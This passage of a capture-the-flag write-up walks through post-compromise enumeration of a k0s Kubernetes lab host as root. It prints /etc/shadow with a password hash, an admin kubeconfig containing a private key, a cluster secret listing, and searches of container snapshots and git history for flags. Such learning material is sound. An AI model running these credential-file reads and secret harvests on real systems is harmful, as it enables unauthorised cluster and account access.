mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
statd:x:110:65534::/var/lib/nfs:/usr/sbin/nologin
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
etcd:x:998:997::/var/lib/k0s:/usr/sbin/nologin
kube-apiserver:x:997:996::/var/lib/k0s:/usr/sbin/nologin
konnectivity-server:x:996:995::/var/lib/k0s:/usr/sbin/nologin
kube-scheduler:x:995:994::/var/lib/k0s:/usr/sbin/nologin
root@johnny:~# cat /etc/shadow
root:!:18123:0:99999:7:::
daemon:*:18113:0:99999:7:::
bin:*:18113:0:99999:7:::
sys:*:18113:0:99999:7:::
sync:*:18113:0:99999:7:::
games:*:18113:0:99999:7:::
man:*:18113:0:99999:7:::
lp:*:18113:0:99999:7:::
mail:*:18113:0:99999:7:::
news:*:18113:0:99999:7:::
uucp:*:18113:0:99999:7:::
proxy:*:18113:0:99999:7:::
www-data:*:18113:0:99999:7:::
backup:*:18113:0:99999:7:::
list:*:18113:0:99999:7:::
irc:*:18113:0:99999:7:::
gnats:*:18113:0:99999:7:::
nobody:*:18113:0:99999:7:::
systemd-network:*:18113:0:99999:7:::
systemd-resolve:*:18113:0:99999:7:::
syslog:*:18113:0:99999:7:::
messagebus:*:18113:0:99999:7:::
_apt:*:18113:0:99999:7:::
lxd:*:18123:0:99999:7:::
uuidd:*:18123:0:99999:7:::
dnsmasq:*:18123:0:99999:7:::
landscape:*:18123:0:99999:7:::
pollinate:*:18123:0:99999:7:::
statd:*:18123:0:99999:7:::
sshd:*:18123:0:99999:7:::
vagrant:$6$lSFsvbrB$UiOHTM.XaC9ZC7kCYQKbyV/x8flLycuK26UtQCdy.RZedMASXDQai6l083QArvILrx4FEm3H1WspEveIOKL.m1:19033:0:99999:7:::
vboxadd:!:18123::::::
etcd:!:19033::::::
kube-apiserver:!:19033::::::
konnectivity-server:!:19033::::::
kube-scheduler:!:19033::::::
```

Granted, I could just search for "THM{" in the files, since it's simulated, gamified environment and make my job a bit easier. But my goal isn't to win this the fastest, it's to learn the most. And since in the real job environment I wouldn't search for a substring this way and slowly enumerate through possible secrets, I've decided to go through this path. 

I checked for kubeconfig, the admin credential for the cluster. 

```
root@johnny:~# find / -name "*.conf" -path "*kube*" 2>/dev/null
/var/lib/k0s/kubelet/pods/7ad409d9-d331-494a-921e-d0e7e236d7b9/volumes/kubernetes.io~configmap/kube-proxy/kubeconfig.conf
/var/lib/k0s/kubelet/pods/7ad409d9-d331-494a-921e-d0e7e236d7b9/volumes/kubernetes.io~configmap/kube-proxy/config.conf
/var/lib/k0s/kubelet/pods/7ad409d9-d331-494a-921e-d0e7e236d7b9/volumes/kubernetes.io~configmap/kube-proxy/..2022_02_10_18_56_39.3250161717/kubeconfig.conf
/var/lib/k0s/kubelet/pods/7ad409d9-d331-494a-921e-d0e7e236d7b9/volumes/kubernetes.io~configmap/kube-proxy/..2022_02_10_18_56_39.3250161717/config.conf
/var/lib/k0s/kubelet.conf
/var/lib/k0s/kubelet-bootstrap.conf
```

The find command revealed something interesting, it's not kubeadm but k0s - single-binary Kubernetes distribution. I've searched for location of the admin kubeconfig

```
root@johnny:~# cat /var/lib/k0s/pki/admin.conf

apiVersion: v1
clusters:
- cluster:
    server: https://localhost:6443
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURBRENDQWVpZ0F3SUJBZ0lVY0tubW5LZ0NPQjVqKzVKWHpMajIxeHYvZlBjd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0dERVdNQlFHQTFVRUF4TU5hM1ZpWlhKdVpYUmxjeTFqWVRBZUZ3MHlNakF5TVRBeE9EVXdNREJhRncwegpNakF5TURneE9EVXdNREJhTUJneEZqQVVCZ05WQkFNVERXdDFZbVZ5Ym1WMFpYTXRZMkV3Z2dFaU1BMEdDU3FHClNJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUUN1ZGd5dTdoQUE1RkVrRFpJQ2s3Z3NYbkVBeHdOMzQ2Nk8KNDN6dFovVnAvSVJFYnJTc1dRbWQ4Tk1qV3hlZUwxbkxtV1FBSkdMOWswQ0psdFhvbWVHVk04eEs5L0tjUWxlMAoyeko4bHpWV2dWcHdnb3E5MnJjUXhXOVBnZENFd3lRdC9hUVIzVHdwSzlOeDRrcHMzSkZYK1dyYUxPUkxNWlorCnVpL2Z4UHBHeStTa1NUWEkySmN5MS9iN05DOGhHc010QTQ2TDhMenQ2QkRRVzNTVC9FbmtPdGdPai9MMjdkY3IKTmc3UlhpVThhdk0ydzlDS0pQbnp1b1k0dDdXZnRZeG1mWHFWRmdBaDRrWW9ONzJ1V2RsU1hOVnF0SkpSdkhDdgo2ZlpZbWFJK295bWtUaisrQVFHSGxjSGFnTE1VWXlvQVdVYXhxTTl2dE9HTVRpbGdjMWFqQWdNQkFBR2pRakJBCk1BNEdBMVVkRHdFQi93UUVBd0lCQmpBUEJnTlZIUk1CQWY4RUJUQURBUUgvTUIwR0ExVWREZ1FXQkJSUVpWcloKeENxVVRkME1KbHVkY0duSC9xS0xNREFOQmdrcWhraUc5dzBCQVFzRkFBT0NBUUVBaFdTTnRpMDEvMUVIZDVLbApnQ1llbDJpV29ielRXVmVsdzNMcXNYOEVuZ1RFYmlqUDJEVGF2RWpHV1ZzTzB1WWt2THp1dTdtT2Z3WDJDTFJ1CmY5Y3hScmRxeTRuSExxRkpkUVFwMjlMVmF1VXhoUHFNcjgxeVYxT1NYUzdmdFpNYngwZHBaSktaUnV1QzFhNUUKeE9lMkNXbU84QTJtVjhZcWU1eXRHNExzUko5ZWp5aEd4T21aNjZMVzBwck9zTnRhb2RUQnZlZkxYVFRlaXg1agpJZHhkaHVjaHYyeTFUa2pnSzZyNGZ3aTkrOWxtUTdnMEVEMFZEMkNMUWNnSFBwZ3BaYk51MTk1VHZFa3R4TWZ2CjlCbW81cEpXU0I5QTgzTFk0OVQ4U2VNMlQwdTk3dXpGNW83Z2lsbERGeGRvbFF3NGlRRmNLRytTUzI5d2QvYVIKcVhPeWhRPT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=
  name: local
contexts:
- context:
    cluster: local
    namespace: default
    user: user
  name: Default
current-context: Default
kind: Config
preferences: {}
users:
- name: user
  user:
    client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURXVENDQWtHZ0F3SUJBZ0lVRlY0TXJWK1pPOUdwbE5JUHlnVkt2TjlxR0Njd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0dERVdNQlFHQTFVRUF4TU5hM1ZpWlhKdVpYUmxjeTFqWVRBZUZ3MHlOakV3TVRreE1USTBNREJhRncweQpOekV3TVRreE1USTBNREJhTURReEZ6QVZCZ05WQkFvVERuTjVjM1JsYlRwdFlYTjBaWEp6TVJrd0Z3WURWUVFECkV4QnJkV0psY201bGRHVnpMV0ZrYldsdU1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0MKQVFFQXoxUGJNcGFhWVcwK0owdm5NZW1nL2g3SWFHMnQraEJNMThrZ1dESEpjNjRVcXVsYzlzWGlGajBJRWlEdgpjcXo5Z2hGVmN0Q0J4Y2NHMDlkUmlPOU9yb1dBbjJBbVhkalpUaHlrTU9YTjFBR1FrZGVkakpFNXdiVWk0MjFOCnFIS2ZsckRVWE5kcERTc1FmZjRsMGNablJmT0VWN0NYNnFaTHNPbFh3SExpMDR3VWxXc2wrVmxGdWRyalR6bjMKWWo4ckZUREJQaXFRY05xaVUrWDNxYzhsdkViK0d4S3pvemZ0aDJ4WGxTSER3dm55V2l6eE9XTERHWG84TTBrVwpINDRhN1lxVktRRHhkNlI0VmNlK0FiVkdPaE0wTmdaS2dEQ1owQjE4aEp0Y2svWGhxbytUM1JjZy96aVA2S1ZQCnFBVVYvYWJkTG1ZSjUwb0NPTVVvZGdHbFdRSURBUUFCbzM4d2ZUQU9CZ05WSFE4QkFmOEVCQU1DQmFBd0hRWUQKVlIwbEJCWXdGQVlJS3dZQkJRVUhBd0VHQ0NzR0FRVUZCd01DTUF3R0ExVWRFd0VCL3dRQ01BQXdIUVlEVlIwTwpCQllFRkVJejl0Rmc0Yms3S3R1TG5RV1MvUUtiNGZpK01COEdBMVVkSXdRWU1CYUFGRkJsV3RuRUtwUk4zUXdtClc1MXdhY2Yrb29zd01BMEdDU3FHU0liM0RRRUJDd1VBQTRJQkFRQ05pTU1aeUloUEQrOUg2dEN4c1o2WjlkMmQKSERSdFpuQk9vS1JVd2hHcDZyRjV4T3Npdk1PMHBRd0NFeTZWWUs4WXhRV0JLOTZIZGlOVCtzK2hZUmlvNGtiRgppWU9wMnBWZzBPTythQ0VaRXpQWDBnQWhtR3UxR3A3MkRiUGR5cW1nNmlWbytTUk5rS0RPZXBlZGVvSFNrRTBsCk80RDhqSjlmdFNTQjFjdFRIdTUxVDN2clBrbHlSMnRzOVd0M3pPeVFIWlR2YWxPRU1YSitmblV4S1pLTjgxTlIKV0Npbk1pVHV6VU1uNU8rUXlMaU40TnFoQTNtcEhSZHdpaFRFSFcyeVpuVEdkOWQzR0s4RFpoV0JER3hUVWlrUgp6SVR3TzFUTHN1N2o4eklBQ1I3dGtReElZOEhnZ1F4eDVvMlZpSzZJeThyTVJqOXB4eXFMVGVCcElNZGsKLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=
    client-key-data: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBejFQYk1wYWFZVzArSjB2bk1lbWcvaDdJYUcydCtoQk0xOGtnV0RISmM2NFVxdWxjCjlzWGlGajBJRWlEdmNxejlnaEZWY3RDQnhjY0cwOWRSaU85T3JvV0FuMkFtWGRqWlRoeWtNT1hOMUFHUWtkZWQKakpFNXdiVWk0MjFOcUhLZmxyRFVYTmRwRFNzUWZmNGwwY1puUmZPRVY3Q1g2cVpMc09sWHdITGkwNHdVbFdzbAorVmxGdWRyalR6bjNZajhyRlREQlBpcVFjTnFpVStYM3FjOGx2RWIrR3hLem96ZnRoMnhYbFNIRHd2bnlXaXp4Ck9XTERHWG84TTBrV0g0NGE3WXFWS1FEeGQ2UjRWY2UrQWJWR09oTTBOZ1pLZ0RDWjBCMThoSnRjay9YaHFvK1QKM1JjZy96aVA2S1ZQcUFVVi9hYmRMbVlKNTBvQ09NVW9kZ0dsV1FJREFRQUJBb0lCQVFES3lCWUk4TXltcGhhNAprTURjVE1vdVF5VjVIbTJmdS9tc3hRZGh1N0J4K0w0MlBIRzAyKzg2R1ErZnk1N241dE05T0g3L0FYa3NYSElOCkdQaWltbzIybk5VbERRSDVvSE5LdHpEUXNyUVN2RVVPb0hsMFYwYktjOFJmOVRTVG9TaitWbzRmRUlHclk0ZUoKODk1QnczQ1hOb3NteVk2TTc0SHcwd29GTFZrMTFuVHh6dDdwU0E1NzJ5M1FBUzIrRDZVUWhBVENzUWRFd0djLwpzZkVyb1E1Z0Q4U2VFUU5yMEJKYXNlRHlObm1UbUcyR3BNbWY0QnMrYUJTL2NUOEVRTlZYczlQMWIzSG41STZGClJxTXVDa0VVWFRTWGtGMk5JT0ZGc0FuWVB0dXhuVEVXNzAyWElVTlNTMzUxN3JwSEN4OURXTWhCOVhYOFpxcHgKeCtPUGRLRVJBb0dCQU5VYTVic2RkSSt5N0FwMFdDUy8xcjVKaWd5TXNFa0xNSHc5MXMzUkpZWGFsOGQveHA2Mgpsa0NSc3RLa3owcWYxaWJhVFEyaEdLNVdacHRZb2JRQ3lTY2RCUE1WZ25XWXdqL1A1dnltWHpVcTUvMTF6ejFuCmc4VWlMTnZkeFYvMlhxZ3ArMnY4eHlDZFhxSTJWdGtvYWF3RlJMekVRQWhoRTVZSHlrcVduL0VEQW9HQkFQa1AKUCtBTkhkck5UZXlCNytmaVhjNFpUVEZOd1JxNVM1ZXZMTnVMNEs2M3loQ0wrSHA1Y0FROGhtNjdxN1hwL1RYeAo1U2prVnZITWNOU0EyYVdaMXFtUGQ0dGk5TkJKRDFjMEpTQnI2WjJZNFdmR2NRVW1uSk1YZDBCRjdiR29xR3MvCmZxN25URlZhOEZhbGxlc2I4djd4ajlFYWhhSDhjUFd6NHRXNldjdHpBb0dBVUQzWmhQUlpZSVpwbEtJc1VtSWQKMVBiUjBWbmtRd3pBaS9lbyswU21VVmwyenpyUXFoQnNVUkhMZUw5d0FsUmZDYkFuVlZ0MGRLaTU2QUtlbUs1MwoyWTkydnFVNXcxZnF4S1plL29FUzFtMDZmMWl0MlJ3eUpMZHlsck5SejRsd0tQZnQ0TUtFcEVZOVRPMFRGSisvCjhuTGxhQUtwYmI1SDVyVTJPWkd2MWNzQ2dZRUFyR0tLc3BoQmpyMUZieXFzazVKUm5TSlVGSWtkM0ZKZWFQbTkKa2FRcWVxUUpQeFN5Z29ybEpubUNEc2prMjcrK0hBVjJ1S3Y3SmRkOFRRbDJHN0gwSzE1NnZzWmFib1B6RTBlcgpYdHB5VXp1SzRGb3d4Z0RvcE1LOExvZDRNdHhxM2ZpUHhaMmdidi9IbENGK044SWJtYXcyLytOY2xUYjJOSW95CnVmNEd3dE1DZ1lCUGxnNEpKWEJ1NEhUeEVPQ1h1MTRVYWxBbjhadU4wYm1kbUkvTGZFQkNvU2FDZ290QkNSWWwKSFZLOG5UdTU0R0NSSmEyUmJDbU5Sc1kreWJyL3FibCsrSHJ2UlpIRzNYTFdDRnF5N1R3cWY5RVk2bkZXV2lLTwpmZzd0YmIxNUwxTi8rbGUzRFRmZGh4K2xLTit1L1ZYc1NIL29iY0phZmVqVnh5SC8vSk0zMFE9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=

```


```
root@johnny:~# kubectl
-bash: kubectl: command not found
root@johnny:~# k0s kubectl
kubectl controls the Kubernetes cluster manager.

 Find more information at: https://kubernetes.io/docs/reference/kubectl/overview/

Aliases:
kubectl, kc

Basic Commands (Beginner):
  create        Create a resource from a file or from stdin
  expose        Take a replication controller, service, deployment or pod and expose it as a new Kubernetes service
  run           Run a particular image on the cluster
  set           Set specific features on objects

```

I checked:

```
k0s kubectl describe nodes -A
```

etc.

Then I remembered. Secret... SECRET! 

```
root@johnny:~# k0s kubectl get secrets -A 
NAMESPACE         NAME                                             TYPE                                  DATA   AGE
kube-system       token-cleaner-token-rgx9m                        kubernetes.io/service-account-token   3      4y251d
kube-system       disruption-controller-token-l98nb                kubernetes.io/service-account-token   3      4y251d
kube-system       certificate-controller-token-dtfzc               kubernetes.io/service-account-token   3      4y251d
kube-system       ttl-controller-token-987w7                       kubernetes.io/service-account-token   3      4y251d
kube-system       horizontal-pod-autoscaler-token-h6qr6            kubernetes.io/service-account-token   3      4y251d
kube-system       bootstrap-signer-token-z89rz                     kubernetes.io/service-account-token   3      4y251d
kube-system       node-controller-token-dd7cj                      kubernetes.io/service-account-token   3      4y251d
kube-system       kube-proxy-token-g4c4x                           kubernetes.io/service-account-token   3      4y251d
kube-system       coredns-token-7rg4w                              kubernetes.io/service-account-token   3      4y251d
kube-system       kube-router-token-59t6j                          kubernetes.io/service-account-token   3      4y251d
kube-system       pvc-protection-controller-token-ktc6j            kubernetes.io/service-account-token   3      4y251d
kube-system       endpointslicemirroring-controller-token-82rbj    kubernetes.io/service-account-token   3      4y251d
kube-system       replication-controller-token-lnpvr               kubernetes.io/service-account-token   3      4y251d
kube-system       deployment-controller-token-wqq6l                kubernetes.io/service-account-token   3      4y251d
kube-system       ttl-after-finished-controller-token-zqm9v        kubernetes.io/service-account-token   3      4y251d
kube-system       attachdetach-controller-token-2rfmq              kubernetes.io/service-account-token   3      4y251d
kube-system       endpointslice-controller-token-hm249             kubernetes.io/service-account-token   3      4y251d
kube-system       replicaset-controller-token-ww59d                kubernetes.io/service-account-token   3      4y251d
kube-system       service-controller-token-n75dw                   kubernetes.io/service-account-token   3      4y251d
kube-system       expand-controller-token-6lsd6                    kubernetes.io/service-account-token   3      4y251d
kube-system       namespace-controller-token-jqj4f                 kubernetes.io/service-account-token   3      4y251d
kube-system       service-account-controller-token-g24vt           kubernetes.io/service-account-token   3      4y251d
kube-system       clusterrole-aggregation-controller-token-lnl8j   kubernetes.io/service-account-token   3      4y251d
kube-system       pod-garbage-collector-token-c78hn                kubernetes.io/service-account-token   3      4y251d
kube-system       daemon-set-controller-token-w4kd2                kubernetes.io/service-account-token   3      4y251d
kube-system       cronjob-controller-token-xp6cr                   kubernetes.io/service-account-token   3      4y251d
kube-system       statefulset-controller-token-dcfpq               kubernetes.io/service-account-token   3      4y251d
kube-system       persistent-volume-binder-token-5gjd2             kubernetes.io/service-account-token   3      4y251d
kube-system       pv-protection-controller-token-7jvhp             kubernetes.io/service-account-token   3      4y251d
kube-system       metrics-server-token-nsmgv                       kubernetes.io/service-account-token   3      4y251d
kube-system       root-ca-cert-publisher-token-77twl               kubernetes.io/service-account-token   3      4y251d
kube-system       ephemeral-volume-controller-token-md4tn          kubernetes.io/service-account-token   3      4y251d
kube-system       endpoint-controller-token-xq6lz                  kubernetes.io/service-account-token   3      4y251d
kube-system       resourcequota-controller-token-586sm             kubernetes.io/service-account-token   3      4y251d
kube-system       job-controller-token-tnl5p                       kubernetes.io/service-account-token   3      4y251d
kube-system       generic-garbage-collector-token-q2m67            kubernetes.io/service-account-token   3      4y251d
internship        default-token-nj2vr                              kubernetes.io/service-account-token   3      4y251d
default           default-token-nhwb5                              kubernetes.io/service-account-token   3      4y251d
kube-system       default-token-44sq6                              kubernetes.io/service-account-token   3      4y251d
kube-public       default-token-svwqv                              kubernetes.io/service-account-token   3      4y251d
kube-node-lease   default-token-mm282                              kubernetes.io/service-account-token   3      4y251d
default           k8s.authentication                               Opaque                                1      4y251d

```

One of them doesn't look like the others - type `kubernetes.io/service-account-token` vs `Opaque`

![](secret.png)


# Part 3

> _Pods_ are the smallest deployable computing units you can create and manage in Kubernetes. 
> 
The _Pod also_ shares storage.  Enumerate the pod-shared storage location and find the flag!

Task clearly hints at the volumes and I'm not gonna lie, pod "internship-job" really catches my eye. Cue "intern destroyed prod" meme. 

```
root@johnny:~# k0s kubectl get pods -A 
NAMESPACE     NAME                              READY   STATUS      RESTARTS   AGE
internship    internship-job-5drbm              0/1     Completed   0          4y251d
kube-system   kube-router-vsq85                 1/1     Running     0          4y251d
kube-system   metrics-server-74c967d8d4-pvv8l   1/1     Running     0          4y251d
kube-system   kube-api                          1/1     Running     0          4y251d
kube-system   coredns-6d9f49dcbb-9vbff          1/1     Running     0          4y251d
kube-system   kube-proxy-jws4q                  1/1     Running     0          4y251d
```

```
root@johnny:~# k0s kubectl describe pod internship-job-5drbm -n internship
Name:         internship-job-5drbm
Namespace:    internship
(...)
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-6lbrd (ro)
(...)
Volumes:
  kube-api-access-6lbrd:
    Type:                    Projected (a volume that contains injected data from multiple sources)
    TokenExpirationSeconds:  3607
    ConfigMapName:           kube-root-ca.crt
    ConfigMapOptional:       <nil>
    DownwardAPI:             true
```

The only volume it has is `kube-api-access-6lbrd`, which is the automatic projected ServiceAccount token every pod gets. No `emptyDir`, no `hostPath`, no PVC.


That's a bummer. Let's broaden the search. 

```
root@johnny:~# k0s kubectl get pv,pvc -A
No resources found
```

I've searched through volumes of all the pods in a cluster but didn't find anything interesting. However after closer look, kube-api pod is the main suspect. It looks almost like a valid pod, `kube-system` namespace, however the name is a bit different than the pod I'd expect: `kube-api` vs `kube-apiserver`. 


```
root@johnny:~# k0s kubectl describe pod kube-api -n kube-system
Name:         kube-api
Namespace:    kube-system
Priority:     0
Node:         johnny/10.0.2.15
Start Time:   Thu, 10 Feb 2022 18:58:08 +0000
Labels:       app=kube-api
Annotations:  kubernetes.io/psp: 00-k0s-privileged
Status:       Running
IP:           10.244.0.3
IPs:
  IP:  10.244.0.3
Containers:
  kube-api:
    Container ID:  containerd://0f4fa23abf6757498773e0bb79f7fc8134e3edf8213ff6493e6a88f333957e19
    Image:         csaju/jokes:latest
    Image ID:      docker.io/csaju/jokes@sha256:0e39f7cbeef2a8f9dfa926ea6ec28335b8a705be90b8c91667be30bad8c871f5
    Port:          <none>
    Host Port:     <none>
    Command:
      /bin/bash
      -c
      --
    Args:
      while true; do sleep 30; done;
    State:          Running
      Started:      Thu, 10 Feb 2022 18:59:16 +0000
    Ready:          True
    Restart Count:  0
    Limits:
      cpu:     1
      memory:  512Mi
    Requests:
      cpu:        200m
      memory:     256Mi
    Environment:  <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-6p9t7 (ro)
Conditions:
  Type              Status
  Initialized       True 
  Ready             False 
  ContainersReady   True 
  PodScheduled      True 
Volumes:
  kube-api-access-6p9t7:
    Type:                    Projected (a volume that contains injected data from multiple sources)
    TokenExpirationSeconds:  3607
    ConfigMapName:           kube-root-ca.crt
    ConfigMapOptional:       <nil>
    DownwardAPI:             true
QoS Class:                   Burstable
Node-Selectors:              <none>
Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:                      <none>

```

image: csaju/jokes:latest
Args: while true; do sleep 30; done;

I wanted to go into the container and take a look into the filesystem: 

```
root@johnny:~# k0s kubectl exec -it kube-api -n kube-system -- /bin/bash
Error from server: error dialing backend: dial tcp 10.0.2.15:10250: i/o timeout
```

That's the kubelet (port 10250) being unreachable for the exec stream, so interactive `exec` won't work.

I have a container ID from describe command:
```
    Container ID:  containerd://0f4fa23abf6757498773e0bb79f7fc8134e3edf8213ff6493e6a88f333957e19
```

Then I wanted to run a container interactively: 

```
root@johnny:~# docker run --rm -it csaju/jokes:latest /bin/sh
Unable to find image 'csaju/jokes:latest' locally
docker: Error response from daemon: Get "https://registry-1.docker.io/v2/": net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).
See 'docker run --help'
```

```
root@johnny:~# docker run --rm -it csaju/jokes:latest /bin/sh
Unable to find image 'csaju/jokes:latest' locally
docker: Error response from daemon: Get "https://registry-1.docker.io/v2/": net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).
See 'docker run --help'.
root@johnny:~# docker image ls
REPOSITORY    TAG       IMAGE ID       CREATED       SIZE
csaju/ctf     latest    3936140d50bb   4 years ago   66.3MB
csaju/angur   latest    08b01934dbb9   4 years ago   275MB
root@johnny:~# docker run --rm -it csaju/ctf:latest /bin/sh
  File "/bin/sh", line 1
SyntaxError: Non-UTF-8 code starting with '\x8d' in file /bin/sh on line 2, but no encoding declared; see http://python.org/dev/peps/pep-0263/ for details
root@johnny:~#
root@johnny:~# docker ps -a
CONTAINER ID   IMAGE         COMMAND             CREATED       STATUS         PORTS                                       NAMES
54c2fca370f6   csaju/angur   "/run.sh"           4 years ago   Up 4 minutes   0.0.0.0:3000->3000/tcp, :::3000->3000/tcp   angur
e7c06a854957   csaju/ctf     "python3 main.py"   4 years ago   Up 4 minutes   0.0.0.0:5000->5000/tcp, :::5000->5000/tcp   ctf
```

`docker image ls` shows `csaju/ctf` and `csaju/angur`, but _not_ `csaju/jokes`. That's the tell: the `kube-api` pod runs under k0s's **containerd**, which is a completely separate image/container store from the host's **Docker daemon**. So Docker can't see the jokes image, and the Docker pull timed out because this host has no outbound internet (only your attacker box does).

I've searched for the joke in the container snapshots 

```
root@johnny:~# grep -rIi "joke" /var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs 2>/dev/null
(...)
/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/39/fs/root/.bash_history:cd jokes/
/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes/crush.jokes:Do I really need to tell you a joke? Can’t we just kiss and be done with it?
/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes/.git/config:	url = https://github.com/Aju100/jokes
/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes/.git/logs/refs/heads/master:0000000000000000000000000000000000000000 224b741fa904ee98c75913eafbefa12ac820659f root <root@csaju.(none)> 1644256045 +0545	clone: from https://github.com/Aju100/jokes
/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes/.git/logs/refs/remotes/origin/HEAD:0000000000000000000000000000000000000000 224b741fa904ee98c75913eafbefa12ac820659f root <root@csaju.(none)> 1644256045 +0545	clone: from https://github.com/Aju100/jokes
/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes/.git/logs/HEAD:0000000000000000000000000000000000000000 224b741fa904ee98c75913eafbefa12ac820659f root <root@csaju.(none)> 1644256045 +0545	clone: from https://github.com/Aju100/jokes
```


This was interesting line but no luck `/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/39/fs/root/.bash_history:cd jokes/`

```
root@johnny:~# cat /var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/39/fs/root/.bash_history
ls
clear
ls
cd jokes/
ls
cd ..
exit
```

```
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# la
crush.jokes  dad.jokes  .git  mom.jokes  programming.jokes
```

```
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# cat programming.jokes
(...)
Don’t worry if it doesn’t work right. If everything did, you’d be out of a job. (Mosher’s Law of Software Engineering)
```

A set of jokes per every file but no secret - but it's not the end of the world, as I still have a git to check out. 

```
git log
commit 224b741fa904ee98c75913eafbefa12ac820659f (HEAD -> master, origin/master, origin/HEAD)
Author: Aju100 <ajutamang10@outlook.com>
Date:   Mon Feb 7 22:38:15 2022 +0545

    feat: add programming.jokes

commit 22cd540f3df22a2f373d95e145056d5370c058f5
Author: Aju100 <ajutamang10@outlook.com>
Date:   Mon Feb 7 22:37:41 2022 +0545

    feat: add crush.jokes

commit 4b2c2d74b31d922252368c112a3907c5c1cf1ba3
Author: Aju100 <ajutamang10@outlook.com>
Date:   Mon Feb 7 22:37:13 2022 +0545

    feat: add cold.joke

commit 2be20457c290fa1e8cc8d18cd5b546cec474691c
Author: Aju100 <ajutamang10@outlook.com>
Date:   Mon Feb 7 22:34:54 2022 +0545

    feat: add mom.jokes

commit cc342469e2a4894e34a3e6cf3c7e63603bd4753e
Author: Aju100 <ajutamang10@outlook.com>
Date:   Mon Feb 7 22:34:09 2022 +0545

    feat: add dad.jokes
```

There's one file that wasn't listed with `la`

![](git-secret.png)

# Part 4

> You have been shortlisted and you have upcoming interview rounds for a FANG company! Find the secret that has been left behind.


I swear it must be the internship resource, I just don't believe that they didn't do anything fun with it. It's illegal to provide "internship" resources to an aspiring CTFer and don't include anything fun. 

```
root@johnny:~# k0s kubectl get all -n internship
NAME                       READY   STATUS      RESTARTS   AGE
pod/internship-job-5drbm   0/1     Completed   0          4y252d

NAME                       COMPLETIONS   DURATION   AGE
job.batch/internship-job   1/1           3m10s      4y252d
```

```
root@johnny:~# k0s kubectl logs internship-job-5drbm -n internship
Error from server: Get "https://10.0.2.15:10250/containerLogs/internship/internship-job-5drbm/internship-job": dial tcp 10.0.2.15:10250: i/o timeout
```

```
root@johnny:~# k0s kubectl describe job internship-job -n internship
Name:             internship-job
Namespace:        internship
Selector:         controller-uid=11cf55dc-7903-4b78-b9d3-62cf241ad26d
Labels:           controller-uid=11cf55dc-7903-4b78-b9d3-62cf241ad26d
                  job-name=internship-job
Annotations:      batch.kubernetes.io/job-tracking: 
Parallelism:      1
Completions:      1
Completion Mode:  NonIndexed
Start Time:       Thu, 10 Feb 2022 18:56:16 +0000
Completed At:     Thu, 10 Feb 2022 18:59:26 +0000
Duration:         3m10s
Pods Statuses:    0 Active / 1 Succeeded / 0 Failed
Pod Template:
  Labels:  controller-uid=11cf55dc-7903-4b78-b9d3-62cf241ad26d
           job-name=internship-job
  Containers:
   internship-job:
    Image:      busybox
    Port:       <none>
    Host Port:  <none>
    Command:
      echo
      26c3d1c068e7e01599c3612447410b5e56c779f1
    Environment:  <none>
    Mounts:       <none>
